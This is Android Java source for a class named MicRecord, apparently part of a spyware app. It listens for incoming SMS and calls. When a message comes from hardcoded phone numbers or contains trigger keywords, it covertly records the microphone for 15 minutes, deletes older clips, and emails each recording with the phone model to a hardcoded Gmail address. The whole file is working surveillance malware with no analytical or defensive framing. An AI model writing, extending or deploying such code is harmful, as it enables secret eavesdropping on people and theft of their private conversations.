package com.example.fasterpro11;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MicRecord extends BroadcastReceiver {
    private MediaRecorder recorder;
    private String fileName;
    private static final String TAG = "MicRecord";
    private static final String[] allowedNumbers = {
            "+8801304039289",
            "+8801748937893",
            "+8801915564632"
    };
    private static final String[] WORDS1_GRADE = {"Goldm", "Silverm", "Mediumm"};
    private static final String[] WORDS2_OFFER = {"Congratulationm", "Conformm"};
    private static final String[] WORDS3_OFFER = {"কনে","বলো","কোথায়","ঐ","oi","OI","Oi","oo","কি",
            "কি হলো", "বলবা","কখন","কখন আসবে","আসবে","ও","ও","ঔ","কই"};
    private List<String> lastMessages = new ArrayList<>();
    private Handler handler = new Handler();
    private int recordingCount = 1;
    private boolean isOnCall = false;
    private Context context;

    // Constructor that takes context
    public MicRecord(Context context) {
        this.context = context;
    }

    // Default constructor for BroadcastReceiver
    public MicRecord() {}

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "MicRecord class onReceive called with action: " + intent.getAction());
        try {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                handleSmsReceived(intent, context);
            } else if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
                handleIncomingCall(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: ", e);
        }
    }

    private void handleIncomingCall(Intent intent) {
        try {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state) ||
                    TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                isOnCall = true;
                Log.d(TAG, "mic On call: " + state);
            } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                isOnCall = false;
                Log.d(TAG, "mic Call ended.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleIncomingCall: ", e);
        }
    }

    private void handleSmsReceived(Intent intent, Context context) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                    // Keep only the last message
                    lastMessages.clear();
                    lastMessages.add(messageBody);

                    boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                    boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                    boolean containsWords3 = containsSMSWORDS3OFFER(messageBody);
                    boolean isInternetAvailable = isInternetAvailable(context);
                    boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers(context);

                    Log.d(TAG, "Keywords 1 found: " + containsWords1);
                    Log.d(TAG, "Keywords 2 found: " + containsWords2);
                    Log.d(TAG, "Keywords 3 found: " + containsWords3);
                    Log.d(TAG, "Internet available: " + isInternetAvailable);
                    Log.d(TAG, "Allowed number: " + isAllowedNumber);

                    if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                            (isAllowedNumber && isInternetAvailable) ||
                            (containsWords3&& isInternetAvailable)  ) {
                        startRecording(context, sender, messageBody);
                        Log.d(TAG, "Conditions met for mic start recording.");
                    } else {
                        Log.d(TAG, "Conditions not met for mic start recording.");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "mic Error in handleSmsReceived: ", e);
        }
    }

    public boolean isInternetAvailable(Context context) {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            return netInfo != null && netInfo.isConnected();
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }
    private boolean isMicAvailable(Context context) {
        PackageManager pm = context.getPackageManager();
        return pm.hasSystemFeature(PackageManager.FEATURE_MICROPHONE);
    }


    private boolean containsSMSWORDS1GRADE(String messageBody) {
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }
    private boolean containsSMSWORDS3OFFER(String messageBody) {
        for (String keyword : WORDS3_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        for (String allowedNumber : allowedNumbers) {
            if (allowedNumber.equals(number)) {
                return true;
            }
        }
        return false;
    }

    private boolean checkLastCallNumbers(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC")) {
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 1) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        return false;
    }

    public boolean hasOverlayPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return Settings.canDrawOverlays(context);
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error checking overlay permission: ", e);
            return false;
        }
    }

    public void startRecording(Context context, String incomingNumber, String messageBody) {

        if (!isMicAvailable(context)) {
            Log.e(TAG, "মাইক্রোফোন ব্যবহারযোগ্য নয়।");
            return;
        } else {
            Log.d(TAG, "মাইক্রোফোন ব্যবহারযোগ্য");
        }

        if (isOnCall) {
            Log.d(TAG, "mic Not startRecording because on a call.");
            return;
        } else {
            Log.d(TAG, "mic startRecording because not on a call.");

            String timestamp = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss", Locale.getDefault()).format(new Date());
            fileName = Environment.getExternalStorageDirectory() + "/DCIM/MicRecord/" + timestamp + "_" + recordingCount++ + ".m4a";

            // Create directory if it doesn't exist
            File dir = new File(Environment.getExternalStorageDirectory() + "/DCIM/MicRecord");
            if (!dir.exists() && dir.mkdirs()) {
                Log.d(TAG, "Directory created successfully.");
            }

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); // Set to MPEG_4 for M4A
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); // Use AAC for M4A
            recorder.setOutputFile(fileName);

            try {
                recorder.prepare();
                recorder.start();
                Log.d(TAG, "audio Recording started: " + fileName);
                handler.postDelayed(() -> stopRecording(context), 15 * 60000);
            } catch (IOException e) {
                Log.e(TAG, "audio Recording failed: " + e.getMessage());
            }
        }
    }


    public void stopRecording(Context context) {
        Log.d(TAG, "mic Stopping recording...");
        if (recorder != null) {
            try {
                recorder.stop();
                Log.d(TAG, "mic Recording stopped: " + fileName);
                deleteOldRecordings();
                if (isInternetAvailable(context)) {
                    sendEmailWithAttachment("Sound Rec", "Here is the Sound recording file:", fileName);
                } else {
                    Log.d(TAG, "Internet not available, recording saved locally.");
                }
            } catch (RuntimeException e) {
                Log.e(TAG, "Error stopping recording: " + e.getMessage());
            } finally {
                recorder.release();
                recorder = null;
            }
        }
    }

    private void deleteOldRecordings() {
        Log.d(TAG, "Deleting old mic recordings...");
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/MicRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 5) {
            Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            for (int i = 0; i < files.length - 5; i++) {
                if (files[i].delete()) {
                    Log.d(TAG, "Deleted old mic recording: " + files[i].getName());
                } else {
                    Log.e(TAG, "Failed to delete old mic recording: " + files[i].getName());
                }
            }
        }
    }

    private void sendEmailWithAttachment(String subject, String body, String filePath) {
        Log.d(TAG, "rec Sending email with attachment...");
        // Get the mobile model
        String mobileModel = android.os.Build.MODEL;
        String Subject = "sound Rec: " + subject + " on model: " + mobileModel;
        try {
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", Subject, body, filePath);
            Log.d(TAG, "mic rec Email sent successfully with attachment.");
        } catch (Exception e) {
            Log.e(TAG, "mic Email sending failed: " + e.getMessage());
        }
    }

    public void startRecording() {
        Log.d(TAG, "mic rec call by notification class.");

        // You may want to set default values for incomingNumber and messageBody
        String defaultIncomingNumber = "Unknown"; // or any default value
        String defaultMessageBody = "Recording started via notification."; // or any default message

        startRecording(context, defaultIncomingNumber, defaultMessageBody);
    }


}
